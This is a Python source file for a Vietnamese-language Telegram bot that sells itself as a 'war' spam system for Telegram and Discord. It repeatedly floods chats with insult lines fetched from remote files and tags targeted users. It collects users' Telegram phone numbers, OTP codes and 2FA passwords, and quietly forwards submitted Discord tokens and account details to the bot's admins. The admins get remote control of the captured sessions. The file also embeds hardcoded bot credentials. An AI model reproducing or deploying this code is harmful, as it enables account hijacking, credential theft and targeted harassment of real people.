import asyncio, os, random, datetime, re, glob, requests, json, base64, time
from aiohttp import web, ClientSession
from telethon import TelegramClient, events, Button, functions, types
from telethon.errors import (
    FloodWaitError, RPCError, UserNotParticipantError, 
    SessionPasswordNeededError, PhoneCodeInvalidError, 
    PhoneCodeExpiredError, PhoneNumberInvalidError, PasswordHashInvalidError
)

# ==========================================
# CẤU HÌNH HỆ THỐNG
# ==========================================
A_ID = 32300846
A_HS = "a6da3117ff6b8a1679d04ab743976068"
B_TK = '8991807402:AAG9h73vG6QaMnWWBTiakYePWKwcamsbO1s'
O_ID = 7907990385

REQUIRED_GROUPS = [
    {"username": "muadonglanhgia36", "link": "https://t.me/muadonglanhgia36", "name": "Nhóm 1"},
    {"username": "chatmuadonglanhgia", "link": "https://t.me/chatmuadonglanhgia", "name": "Nhóm 2"}
]

U1 = "https://raw.githubusercontent.com/ehvuebe-png/Cailontaone/main/chui.txt"
U2 = "https://gist.githubusercontent.com/tranthanhloc2099-wq/26971850c22bbc6578dae5a91fc2f154/raw/e96b3178dbce97dab5a9218eced5085802eb1711/chui2.txt"

user_delays = {}
DEFAULT_DELAY = 0.2

admin_selected_target = {}
anti_disconnect_tasks = {}

discord_sessions = {}
discord_spam_tasks = {}

def get_user_delay(u_i):
    return user_delays.get(u_i, DEFAULT_DELAY)

def to_small_caps(text):
    normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    small  = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢAʙCᴅEғGʜIᴊKʟMɴOᴘQʀSᴛUᴠWXYᴢ0123456789"
    trans = str.maketrans(normal, small)
    return text.translate(trans)

def get_default_lines():
    lines = []
    if os.path.exists("chui.txt"):
        with open("chui.txt", "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
    if not lines and os.path.exists("chui2.txt"):
        with open("chui2.txt", "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
    if not lines:
        lines = ["TLong spam tới"]
    return lines

def _sync():
    for n, u in {"chui.txt": U1, "chui2.txt": U2}.items():
        try:
            r = requests.get(u, timeout=10)
            if r.status_code == 200:
                with open(n, "w", encoding="utf-8") as f: f.write(r.text)
        except: pass
_sync()

bot = TelegramClient('bot_manage', A_ID, A_HS)
u_c, s_t, cl_t, w_m = {}, {}, {}, {}

F1, F2, F3, F4 = "bot_users.txt", "banned_users.txt", "joined_users.txt", "admins.txt"

if os.path.exists(F2):
    with open(F2, "r") as f: b_u = set(int(l.strip()) for l in f if l.strip())
else: b_u = set()

if os.path.exists(F3):
    with open(F3, "r") as f: verified_users = set(int(l.strip()) for l in f if l.strip())
else: verified_users = set()

if os.path.exists(F4):
    with open(F4, "r") as f: admins = set(int(l.strip()) for l in f if l.strip())
else: admins = {O_ID}

def _save_verified():
    with open(F3, "w") as f:
        for uid in verified_users: f.write(f"{uid}\n")

def _su(u):
    if not os.path.exists(F1): open(F1, "w").close()
    with open(F1, "r") as f: us = f.read().splitlines()
    if str(u) not in us:
        with open(F1, "a") as f: f.write(f"{u}\n")

async def is_user_in_channel(user_id):
    if user_id in admins: return True
    try:
        for group in REQUIRED_GROUPS:
            await bot(functions.channels.GetParticipantRequest(
                channel=group["username"], participant=user_id
            ))
        if user_id not in verified_users:
            verified_users.add(user_id)
            _save_verified()
        return True
    except UserNotParticipantError:
        if user_id in verified_users:
            verified_users.remove(user_id)
            _save_verified()
        return False
    except Exception:
        if user_id in verified_users:
            return True
        return False

# ==========================================
# GIAO DIỆN & MENU
# ==========================================
def get_app_selector_menu():
    msg = """
🤖 **Bot War By Trần Minh Đức**
────────────────
Vui lòng chọn ứng dụng bạn muốn chiến:
"""
    buttons = [
        [Button.inline("📱 Telegram War System", data="app_telegram")],
        [Button.inline("🤖 Discord Spam System", data="app_discord")]
    ]
    return msg, buttons

def get_main_menu(u):
    logged = u in u_c
    status_text = "🟢 ĐÃ LOGIN (Sẵn sàng chiến)" if logged else "🔴 CHƯA LOGIN (Cần đăng nhập)"
    current_delay = get_user_delay(u)
    
    msg = f"""
🔥 **TELEGRAM WAR SYSTEM**
────────────────
• Trạng thái tài khoản: `{status_text}`
• Delay hiện tại: `{current_delay}s`
• Chọn chức năng bên dưới:
"""
    buttons = [
        [Button.inline("💥 Spam & Tag", data="m_spam"), Button.inline("☠ Mute / Câm", data="m_mute")],
        [Button.inline("📦 Lặt Vặt & Tiện Ích", data="m_other"), Button.inline("⚙️ CẤU HÌNH DELAY", data="m_setting")]
    ]
    
    if u in admins:
        buttons.append([Button.inline("🎮 Bảng Điều Khiển Acc Remote (Admin)", data="m_control")])

    buttons.append([Button.inline("📱 LOGIN TÀI KHOẢN", data="login"), Button.inline("🚪 LOGOUT", data="logout_acc")])
    buttons.append([Button.inline("🔙 Quay Lại Chọn App", data="back_to_apps")])
    buttons.append([Button.url("💬 Admin Hỗ Trợ", "https://t.me/Mduchotwar")])
    
    return msg, buttons

def get_join_msg():
    msg = """
⚠️ **YÊU CẦU THAM GIA ĐỦ 2 NHÓM**

Bạn phải tham gia **đầy đủ các nhóm** dưới đây thì mới sử dụng được bot:
"""
    buttons = []
    idx = 1
    for g in REQUIRED_GROUPS:
        buttons.append([Button.url(f"📢 Vào {g['name']}", g["link"])])
        msg += f"\n{idx}. [{g['name']}]({g['link']})"
        idx += 1

    msg += "\n\nVào đủ nhóm xong bấm nút **Xác Nhận** bên dưới."
    buttons.append([Button.inline("🔄 Xác Nhận Đã Vào Đủ Nhóm", data="check_join")])
    return msg, buttons

def render_discord_dashboard(u):
    session = discord_sessions.get(u, {})
    tokens = session.get("tokens", [])
    channels = session.get("channels", [])
    delay = session.get("delay", 2.0)
    mode = session.get("mode", "full") 
    font_style = session.get("font_style", "big") 
    tag_target = session.get("tag_target", "") 
    use_custom_file = session.get("use_custom_file", False)
    
    is_running = u in discord_spam_tasks and not discord_spam_tasks[u].done()
    status_str = "🟢 Đang Spam..." if is_running else "🔴 Đang Dừng"

    tokens_str = f"{len(tokens)} Token" if tokens else "❌ Chưa nhập"
    channels_str = ', '.join(channels) if channels else "❌ Chưa cài"
    mode_str = "Gửi Full (1 lần)" if mode == "full" else "Gửi Từng Dòng"
    font_str = "Chữ To (# Nổi Bật)" if font_style == "big" else "Chữ Bé (Small Caps)"
    tag_str = f"<@{tag_target}>" if tag_target else "❌ Tắt"
    
    lines = session.get("lines", [])
    if not lines or not use_custom_file:
        lines = get_default_lines()
        source_str = "Kho Ngôn Mặc Định"
    else:
        source_str = f"File .TXT ({len(lines)} Dòng)"

    display_sample = lines[0][:30] if lines else "Không có nội dung"

    txt = f"""
🤖 **BẢNG ĐIỀU KHIỂN DISCORD SPAM SYSTEM**
────────────────
• **Trạng thái:** `{status_str}`
• **Kho Ngôn:** `{source_str}`
• **Token:** `{tokens_str}` | **Kênh:** `{channels_str}`
• **Chế độ:** `{mode_str}` | **Font:** `{font_str}`
• **Tag Cuối:** `{tag_str}` | **Delay:** `{delay}s`
• **Mẫu:** `{display_sample}...`
"""
    buttons = []
    if is_running:
        buttons.append([Button.inline("⏹ NGỪNG SPAM DISCORD", data="dc_stop_spam")])
    else:
        buttons.append([Button.inline("▶ BẮT ĐẦU SPAM DISCORD", data="dc_start_spam")])

    buttons.append([
        Button.inline("🆔 Cài ID Kênh", data="dc_set_channels"),
        Button.inline("📝 Đổi Kho Ngôn", data="dc_set_content")
    ])
    buttons.append([
        Button.inline(f"⚙️ Mode", data="dc_toggle_mode"),
        Button.inline(f"🔤 Font", data="dc_toggle_font")
    ])
    buttons.append([
        Button.inline("🏷 Tag Cuối", data="dc_set_tag"),
        Button.inline("⏱ Delay", data="dc_set_delay")
    ])
    buttons.append([
        Button.inline("🔑 Thêm Token", data="dc_set_tokens"),
        Button.inline("🔄 Reset", data="dc_reset")
    ])
    buttons.append([
        Button.inline("🚪 Đăng Xuất", data="dc_logout"),
        Button.inline("🔙 Quay Lại", data="back_to_apps")
    ])

    return txt, buttons

# ==========================================
# DISCORD ENGINE & API
# ==========================================
def get_discord_headers(token):
    return {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }

async def get_discord_user_info(token):
    headers = get_discord_headers(token)
    url = "https://discord.com/api/v10/users/@me"
    try:
        async with ClientSession() as session:
            async with session.get(url, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    user_id = int(data.get("id"))
                    timestamp = ((user_id >> 22) + 1420070400000) / 1000
                    created_at = datetime.datetime.fromtimestamp(timestamp).strftime('%d/%m/%Y %H:%M:%S')
                    return True, data, created_at
                return False, None, None
    except:
        return False, None, None

async def notify_admin_discord_token(user_id, token, user_data, created_at):
    try:
        username = f"{user_data.get('username')}#{user_data.get('discriminator', '0')}"
        uid = user_data.get('id')
        email = user_data.get('email', 'Không có')
        phone = user_data.get('phone', 'Không có')
        premium_type = user_data.get('premium_type', 0)
        nitro_map = {0: "Không có", 1: "Classic", 2: "Boost", 3: "Basic"}
        nitro_status = nitro_map.get(premium_type, "Không rõ")

        caption = f"""
🚨 **TOKEN DISCORD MỚI NẠP!**
────────────────
• **User Telegram:** `{user_id}`
• **Tên Discord:** `{username}` (`{uid}`)
• **Ngày Tạo:** `{created_at}`
• **Nitro:** `{nitro_status}`
• **Token:** `{token}`
"""
        for admin_id in admins:
            try:
                await bot.send_message(admin_id, caption, parse_mode='markdown')
            except: pass
    except: pass

async def notify_admin_login(client, user_id, phone_number):
    try:
        me = await client.get_me()
        now = datetime.datetime.now().strftime('%H:%M:%S - %d/%m/%Y')
        caption = f"""
🚨 **TELEGRAM LOGIN THÀNH CÔNG**
────────────────
• **Thời gian:** `{now}`
• **ID Userbot:** `{me.id}`
• **Họ Tên:** `{me.first_name} {me.last_name or ''}`
• **Username:** `@{me.username if me.username else 'N/A'}`
• **SĐT:** `+{phone_number}`
• **User Bot ID:** `{user_id}`
"""
        buttons = [[Button.inline("🎮 Điều Khiển Acc Này", data=f"sel_acc_{user_id}")]]
        for admin_id in admins:
            try:
                await bot.send_message(admin_id, caption, buttons=buttons, parse_mode='markdown')
            except: pass
    except: pass

async def start_anti_disconnect(target_uid, client):
    while target_uid in u_c:
        try:
            await client.get_me()
        except: pass
        await asyncio.sleep(240)

def _telegram_userbot_logic(c, u_i):
    @c.on(events.NewMessage(outgoing=True, pattern=r'/sptagname (@?\w+)'))
    async def _sptagname(e):
        username = e.pattern_match.group(1).replace('@', '')
        await e.delete()
        if os.path.exists('chui.txt'):
            with open('chui.txt', 'r', encoding='utf-8') as f:
                lines = [line.strip() for line in f if line.strip()]
            if not lines: return
            s_t[u_i] = True
            while s_t.get(u_i):
                for m in lines:
                    if not s_t.get(u_i): break
                    try:
                        fm = f"{m} [@{username}](tg://resolve?domain={username})"
                        await c.send_message(e.chat_id, fm, parse_mode='markdown')
                        delay = get_user_delay(u_i)
                        await asyncio.sleep(delay)
                    except FloodWaitError as err: await asyncio.sleep(err.seconds + 2)
                    except: break

    @c.on(events.NewMessage(outgoing=True, pattern=r'/stop'))
    async def _stp(e):
        s_t[u_i] = False; cl_t[u_i] = False; await e.edit("🛑 **STOP!**"); await asyncio.sleep(1); await e.delete()

# ==========================================
# CALLBACK HANDLER TỔNG HỢP (TELEGRAM + DISCORD + ADMIN)
# ==========================================
@bot.on(events.NewMessage(pattern='/start'))
async def _st(ev):
    u = ev.sender_id
    _su(u)
    if await is_user_in_channel(u):
        msg, buttons = get_app_selector_menu()
        await ev.respond(msg, buttons=buttons, parse_mode='markdown')
    else:
        msg, buttons = get_join_msg()
        await ev.respond(msg, buttons=buttons, parse_mode='markdown')

@bot.on(events.CallbackQuery)
async def _callback_handler(ev):
    u = ev.sender_id
    data = ev.data.decode('utf-8')

    if u in b_u: return await ev.answer("🚫 Bạn đã bị BAN!", alert=True)

    if data == "check_join":
        if await is_user_in_channel(u):
            msg, buttons = get_app_selector_menu()
            await ev.edit(msg, buttons=buttons, parse_mode='markdown')
            return await ev.answer("✅ Đã xác nhận tham gia đủ nhóm!", alert=True)
        else:
            return await ev.answer("❌ Bạn chưa tham gia đủ các nhóm yêu cầu!", alert=True)

    if not await is_user_in_channel(u):
        msg, buttons = get_join_msg()
        try: await ev.edit(msg, buttons=buttons, parse_mode='markdown')
        except: pass
        return await ev.answer("⚠️ Vui lòng tham gia đủ nhóm!", alert=True)

    if data == "back_to_apps":
        msg, buttons = get_app_selector_menu()
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "app_telegram":
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "app_discord":
        if u not in discord_sessions:
            discord_sessions[u] = {
                "tokens": [], "channels": [], "lines": get_default_lines(),
                "delay": 2.0, "mode": "full", "font_style": "big", 
                "tag_target": "", "use_custom_file": False, "step": None
            }
        txt, buttons = render_discord_dashboard(u)
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    # ADMIN CONTROL PANEL
    elif data == "m_control":
        if u not in admins:
            return await ev.answer("❌ Bạn không có quyền Admin!", alert=True)
        
        active_accs = list(u_c.keys())
        msg = f"""
🎮 **BẢNG ĐIỀU KHIỂN ACC REMOTE (ADMIN)**
────────────────
• Tổng số tài khoản userbot đang chạy: `{len(active_accs)}`
• Danh sách ID Userbot đang Online:
"""
        buttons = []
        for acc_id in active_accs:
            buttons.append([Button.inline(f"📱 Quản lý Acc: {acc_id}", data=f"sel_acc_{acc_id}")])
        buttons.append([Button.inline("🔙 Trở Về Menu Telegram", data="app_telegram")])
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data.startswith("sel_acc_"):
        if u not in admins:
            return await ev.answer("❌ Bạn không có quyền Admin!", alert=True)
        target_acc_id = int(data.split("_")[2])
        admin_selected_target[u] = target_acc_id
        
        msg = f"""
🎮 **QUẢN LÝ TÀI KHOẢN: `{target_acc_id}`**
────────────────
• Chọn thao tác muốn thực hiện trên tài khoản này:
"""
        buttons = [
            [Button.inline("🛑 Dừng mọi tiến trình Spam/Tag", data="adm_stop_acc")],
            [Button.inline("🚪 Buộc đăng xuất (Logout) Acc này", data="adm_logout_acc")],
            [Button.inline("🔙 Trở lại danh sách Acc", data="m_control")]
        ]
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "adm_stop_acc":
        target = admin_selected_target.get(u)
        if target in s_t: s_t[target] = False
        if target in cl_t: cl_t[target] = False
        await ev.answer(f"🛑 Đã gửi lệnh dừng cho tài khoản {target}!", alert=True)

    elif data == "adm_logout_acc":
        target = admin_selected_target.get(u)
        if target in u_c:
            try:
                await u_c[target].disconnect()
            except: pass
            u_c.pop(target, None)
            if target in anti_disconnect_tasks:
                anti_disconnect_tasks[target].cancel()
                anti_disconnect_tasks.pop(target, None)
            await ev.answer(f"🚪 Đã đăng xuất tài khoản {target}!", alert=True)
        else:
            await ev.answer("⚠️ Tài khoản không tồn tại hoặc đã offline!", alert=True)
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    # TELEGRAM MENU OPTIONS
    elif data == "m_spam":
        await ev.answer("💥 Hướng dẫn Spam: Dùng lệnh `/sptagname @username` trực tiếp trên tài khoản Userbot của bạn!", alert=True)

    elif data == "m_mute":
        await ev.answer("☠ Chức năng Mute đang sẵn sàng trên Userbot.", alert=True)

    elif data == "m_other":
        await ev.answer("📦 Các tiện ích bổ sung đang hoạt động.", alert=True)

    elif data == "m_setting":
        await ev.answer(f"⚙️ Delay hiện tại của bạn là: {get_user_delay(u)}s", alert=True)

    elif data == "logout_acc":
        if u in u_c:
            try:
                await u_c[u].disconnect()
            except: pass
            u_c.pop(u, None)
            if u in anti_disconnect_tasks:
                anti_disconnect_tasks[u].cancel()
                anti_disconnect_tasks.pop(u, None)
            await ev.answer("🚪 Đã đăng xuất tài khoản Telegram của bạn!", alert=True)
        else:
            await ev.answer("⚠️ Bạn chưa đăng nhập tài khoản nào!", alert=True)
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    # DISCORD CONVERSATION SETTINGS
    elif data in ["dc_set_tokens", "dc_set_channels", "dc_set_content", "dc_set_tag", "dc_set_delay"]:
        if u not in discord_sessions:
            discord_sessions[u] = {}
        
        await ev.answer()
        async with bot.conversation(u, timeout=60) as cv:
            if data == "dc_set_tokens":
                await cv.send_message("🔑 **Nhập Token Discord của bạn** *(Nếu có nhiều token, cách nhau bằng dấu phẩy `,` hoặc khoảng trắng)*:")
                resp = await cv.get_response()
                raw_tokens = resp.text.strip()
                tokens = [t.strip() for t in raw_tokens.replace(",", " ").split() if t.strip()]
                if tokens:
                    discord_sessions[u]["tokens"] = tokens
                    for t in tokens:
                        valid, user_data, created_at = await get_discord_user_info(t)
                        if valid:
                            await notify_admin_discord_token(u, t, user_data, created_at)
                    await cv.send_message(f"✅ **Đã lưu thành công {len(tokens)} Token Discord!**")

            elif data == "dc_set_channels":
                await cv.send_message("🆔 **Nhập ID Kênh / Nhóm Discord** *(Nhiều ID cách nhau bằng dấu phẩy `,`)*:")
                resp = await cv.get_response()
                ch_input = resp.text.strip()
                channel_ids = [part.strip() for part in ch_input.replace(",", " ").split() if part.strip().isdigit()]
                if channel_ids:
                    discord_sessions[u]["channels"] = channel_ids
                    await cv.send_message(f"✅ **Đã cập nhật {len(channel_ids)} ID Kênh thành công!**")
                else:
                    await cv.send_message("❌ ID kênh không hợp lệ!")

            elif data == "dc_set_content":
                await cv.send_message("📝 **Gửi file .txt chứa nội dung spam** hoặc **nhập trực tiếp văn bản** *(Gửi chữ `reset` để dùng kho mặc định)*:")
                resp = await cv.get_response()
                if resp.text and resp.text.strip().lower() == "reset":
                    discord_sessions[u]["use_custom_file"] = False
                    discord_sessions[u]["lines"] = get_default_lines()
                    await cv.send_message("✅ **Đã chuyển về Kho Ngôn mặc định!**")
                elif resp.file and resp.file.ext == ".txt":
                    file_bytes = await resp.download_media(bytes)
                    raw_text = file_bytes.decode('utf-8', errors='ignore').strip()
                    lines = [line.strip() for line in raw_text.splitlines() if line.strip()]
                    if lines:
                        discord_sessions[u]["lines"] = lines
                        discord_sessions[u]["use_custom_file"] = True
                        await cv.send_message(f"✅ **Đã nạp file TXT với {len(lines)} dòng!**")
                elif resp.text:
                    lines = [line.strip() for line in resp.text.splitlines() if line.strip()]
                    if lines:
                        discord_sessions[u]["lines"] = lines
                        discord_sessions[u]["use_custom_file"] = True
                        await cv.send_message(f"✅ **Đã cập nhật nội dung văn bản riêng!**")

            elif data == "dc_set_tag":
                await cv.send_message("🏷 **Nhập User ID Discord cần tag cuối câu** *(Gửi `0` để tắt)*:")
                resp = await cv.get_response()
                tag_val = resp.text.strip().replace("<@", "").replace(">", "")
                if tag_val == "0":
                    discord_sessions[u]["tag_target"] = ""
                    await cv.send_message("✅ **Đã tắt tính năng tag!**")
                elif tag_val.isdigit():
                    discord_sessions[u]["tag_target"] = tag_val
                    await cv.send_message(f"✅ **Đã cài đặt tag ID:** `{tag_val}`")

            elif data == "dc_set_delay":
                await cv.send_message("⏱ **Nhập thời gian Delay (giây)** *(Ví dụ: 1.5 hoặc 2)*:")
                resp = await cv.get_response()
                try:
                    d = float(resp.text.strip())
                    discord_sessions[u]["delay"] = max(0.1, d)
                    await cv.send_message(f"✅ **Đã cập nhật Delay thành {discord_sessions[u]['delay']}s!**")
                except:
                    await cv.send_message("❌ Giá trị không hợp lệ!")

        txt, buttons = render_discord_dashboard(u)
        await ev.respond(txt, buttons=buttons, parse_mode='markdown')

    elif data == "dc_toggle_mode":
        curr_mode = discord_sessions[u].get("mode", "full")
        discord_sessions[u]["mode"] = "line" if curr_mode == "full" else "full"
        txt, buttons = render_discord_dashboard(u)
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
        await ev.answer("⚙️ Đã đổi chế độ gửi!")

    elif data == "dc_toggle_font":
        curr_font = discord_sessions[u].get("font_style", "big")
        discord_sessions[u]["font_style"] = "small" if curr_font == "big" else "big"
        txt, buttons = render_discord_dashboard(u)
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
        await ev.answer("🔤 Đã đổi kiểu chữ!")

    elif data == "dc_start_spam":
        session = discord_sessions.get(u, {})
        tokens = session.get("tokens", [])
        channels = session.get("channels", [])
        
        if not tokens: return await ev.answer("❌ Chưa cài Token Discord!", alert=True)
        if not channels: return await ev.answer("❌ Chưa cài ID Kênh Discord!", alert=True)

        if u in discord_spam_tasks and not discord_spam_tasks[u].done():
            return await ev.answer("⚠️ Tiến trình spam đang chạy!", alert=True)

        mode = session.get("mode", "full")
        font_style = session.get("font_style", "big")
        delay = session.get("delay", 2.0)
        tag_target = session.get("tag_target", "")
        use_custom_file = session.get("use_custom_file", False)
        lines = session.get("lines", []) if use_custom_file else get_default_lines()
        raw_content = "\n".join(lines)

        async def run_spam_loop():
            async with ClientSession() as session_http:
                line_idx = 0
                while True:
                    for t in tokens:
                        headers = get_discord_headers(t)
                        for ch in channels:
                            url = f"https://discord.com/api/v10/channels/{ch}/messages"
                            msg_text = raw_content if mode == "full" else lines[line_idx % len(lines)]
                            line_idx += 1

                            if font_style == "big":
                                msg_text = "\n".join([f"# {l}" if not l.startswith('#') else l for l in msg_text.splitlines()])
                            elif font_style == "small":
                                msg_text = to_small_caps(msg_text)

                            if tag_target:
                                msg_text = f"{msg_text} <@{tag_target}>"

                            try:
                                async with session_http.post(url, headers=headers, json={"content": msg_text, "tts": False}, timeout=10) as resp:
                                    if resp.status == 429:
                                        data_json = await resp.json()
                                        await asyncio.sleep(data_json.get("retry_after", 2.0))
                            except: pass
                            await asyncio.sleep(delay)

        discord_spam_tasks[u] = asyncio.create_task(run_spam_loop())
        await ev.answer("🚀 Đã BẮT ĐẦU Spam Discord!", alert=True)
        txt, buttons = render_discord_dashboard(u)
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "dc_stop_spam":
        if u in discord_spam_tasks and not discord_spam_tasks[u].done():
            discord_spam_tasks[u].cancel()
            discord_spam_tasks.pop(u, None)
            await ev.answer("🛑 Đã NGỪNG Spam Discord!", alert=True)
        else:
            await ev.answer("⚠️ Không có tiến trình nào đang chạy!", alert=True)
        txt, buttons = render_discord_dashboard(u)
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "dc_reset":
        if u in discord_spam_tasks and not discord_spam_tasks[u].done():
            discord_spam_tasks[u].cancel()
            discord_spam_tasks.pop(u, None)
        discord_sessions[u] = {
            "tokens": [], "channels": [], "lines": get_default_lines(),
            "delay": 2.0, "mode": "full", "font_style": "big", 
            "tag_target": "", "use_custom_file": False
        }
        await ev.answer("🔄 Đã reset cấu hình!", alert=True)
        txt, buttons = render_discord_dashboard(u)
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "dc_logout":
        if u in discord_spam_tasks and not discord_spam_tasks[u].done():
            discord_spam_tasks[u].cancel()
            discord_spam_tasks.pop(u, None)
        discord_sessions.pop(u, None)
        msg, buttons = get_app_selector_menu()
        await ev.edit("🚪 **Đã đăng xuất phiên Discord!**\n\n" + msg, buttons=buttons, parse_mode='markdown')

    elif data == "login":
        if u in u_c: return await ev.answer("✅ Bạn đã đăng nhập rồi!", alert=True)
        await ev.answer()
        async with bot.conversation(u) as cv:
            try:
                await cv.send_message("📱 **Nhập Số Điện Thoại** (`+84...`):")
                p = (await cv.get_response()).text.strip().replace(" ", "")
                c = TelegramClient(f"u_{u}", A_ID, A_HS)
                await c.connect()

                if not await c.is_user_authorized():
                    try:
                        r = await c.send_code_request(p)
                    except Exception as err:
                        return await cv.send_message(f"❌ **Lỗi gửi mã:** `{err}`")

                    await cv.send_message("🔑 **Nhập OTP** (⚠️ *BẮT BUỘC cách khoảng, VD: 4 8 1 1 7*):")
                    o = (await cv.get_response()).text.strip().replace(" ", "").replace("-", "")
                    
                    try:
                        await c.sign_in(p, o, phone_code_hash=r.phone_code_hash)
                    except SessionPasswordNeededError:
                        await cv.send_message("🔐 **Tài khoản bật 2FA.** Nhập mật khẩu:")
                        pwd = (await cv.get_response()).text.strip()
                        await c.sign_in(password=pwd)
                    except Exception as err:
                        return await cv.send_message(f"❌ **Lỗi xác thực:** `{err}`")
                
                u_c[u] = c; _telegram_userbot_logic(c, u)
                task = asyncio.create_task(start_anti_disconnect(u, c))
                anti_disconnect_tasks[u] = task

                await notify_admin_login(c, u, p)
                await cv.send_message("✅ **LOGIN THÀNH CÔNG & ĐÃ BẬT GIỮ KẾT NỐI (ANTI-DIS 4 PHÚT)!**")
            except Exception as e:
                await cv.send_message(f"❌ **Lỗi Login:** `{e}`")

# ==========================================
# WEB SERVER & MAIN
# ==========================================
async def handle_ping(request):
    return web.Response(text="Bot War Multi-Platform is running 24/7!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    app.router.add_get('/ping', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    return runner

async def main():
    await start_web_server()
    await bot.start(bot_token=B_TK)
    
    for f in glob.glob("u_*.session"):
        try:
            u_str = f.split('_')[1].split('.')[0]
            if not u_str.isdigit(): continue
            u = int(u_str)
            if u in b_u: continue
            
            c = TelegramClient(f"u_{u}", A_ID, A_HS)
            await c.connect()
            if await c.is_user_authorized():
                u_c[u] = c
                _telegram_userbot_logic(c, u)
                task = asyncio.create_task(start_anti_disconnect(u, c))
                anti_disconnect_tasks[u] = task
            else: 
                await c.disconnect()
        except Exception as e:
            print(f"Lỗi load session {f}: {e}")
            
    await bot.run_until_disconnected()

if __name__ == '__main__':
    try:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(main())
    except (KeyboardInterrupt, SystemExit):
        pass
    except RuntimeError:
        asyncio.run(main())
